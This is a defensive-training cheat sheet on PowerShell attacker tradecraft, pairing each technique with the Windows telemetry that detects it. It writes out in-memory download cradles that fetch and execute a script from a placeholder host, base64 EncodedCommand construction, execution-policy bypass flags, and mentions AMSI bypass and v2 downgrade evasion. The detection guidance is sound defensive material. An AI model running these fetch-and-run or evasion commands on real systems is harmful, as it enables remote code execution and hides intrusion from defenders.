---
template: cheatsheet.html
hide:
  - navigation
  - toc
---

# Cheat sheet — PowerShell Offensive Tradecraft

*Companion to [Module 15 — PowerShell Offensive Tradecraft](README.md) · CC BY 4.0 — print it, pin it, share it.*

*Last reviewed: 2026-07*

> Only test systems you own or have explicit written permission to test. This is defensive
> education — every primitive below is paired with the telemetry that catches it.

PowerShell is the attacker's favourite because it's *already installed, signed, and trusted*. The
lesson of this module: the trusted shell is **quiet, not invisible** — script-block logging (Event ID
**4104**) records what actually ran, even after obfuscation.

## Download cradles (fetch-and-run in memory, no file on disk)

```powershell
# the classic in-memory cradle
IEX (New-Object Net.WebClient).DownloadString('https://host/s.ps1')
# modern equivalent
IEX (Invoke-WebRequest -UseBasicParsing https://host/s.ps1).Content
#   DETECT: 4104 logs the full expanded script block, cradle and all;
#           Sysmon 3 shows powershell.exe making the outbound connection
```

## EncodedCommand (obfuscation via base64 of UTF-16LE)

```powershell
# build one (what an operator does)
$b = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))
powershell.exe -enc $b

# DECODE one you captured during IR (reverse it):
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('<blob>'))
#   [Text.Encoding]::Unicode IS UTF-16LE — same interleaved-null encoding as data-encoding module
#   DETECT: -enc / -EncodedCommand on the command line (4688/Sysmon 1); 4104 logs the DECODED script
```

Watch for the abbreviated flags that dodge naïve string matching — match on these too:

```
-enc  = -EncodedCommand      -nop  = -NoProfile
-w hidden = -WindowStyle Hidden   -ep bypass = -ExecutionPolicy Bypass
```

## Execution policy is not a security boundary

```powershell
powershell -ep bypass -f script.ps1        # -ep bypass sidesteps it
Get-Content script.ps1 | powershell -       # so does piping to stdin
#   It stops accidents, not attackers — never treat it as a control.
```

## AMSI context (Antimalware Scan Interface)

AMSI lets Defender scan script content *at runtime*, after de-obfuscation — which is why obfuscation
alone doesn't hide a known-malicious script. Operators target the AMSI hook in-process to blind that
scan.

- **DETECT:** AMSI-bypass attempts and the scripts that follow still hit **4104** (script-block logging
  sits below AMSI); AMSI operational logs and Defender events flag known bypass strings.
- **Verify logging is on before you test:** script-block logging is a Group Policy / registry setting —
  if 4104 isn't being written, you can't see your own tradecraft.

## Gotchas worth remembering

- **4104 is the great equalizer.** Script-block logging records the *expanded, de-obfuscated* script
  after PowerShell parses it — so base64, string-concat, and format-operator obfuscation all get logged
  in cleartext. Obfuscation raises analyst effort; it does not defeat the log.
- **Quiet ≠ invisible — the whole module thesis.** A signed, trusted shell generates *less* signature
  alerting, not *no* telemetry. Command line (4688/Sysmon 1), script block (4104), and network
  (Sysmon 3) all still fire.
- **PowerShell v2 downgrade (`-version 2`) skips AMSI and modern logging** — which is exactly why
  defenders remove the v2 engine. If it's present, its *absence* of logging is itself the anomaly.
- **The obfuscation abbreviations are the detection, not the evasion.** `-nop -w hidden -enc` chained
  together is a high-fidelity hunt signature — real admins rarely type that combination.
- **Enable the telemetry first.** If 4104 / command-line auditing isn't configured, finish that before
  claiming a technique was "stealthy" — you just weren't looking.
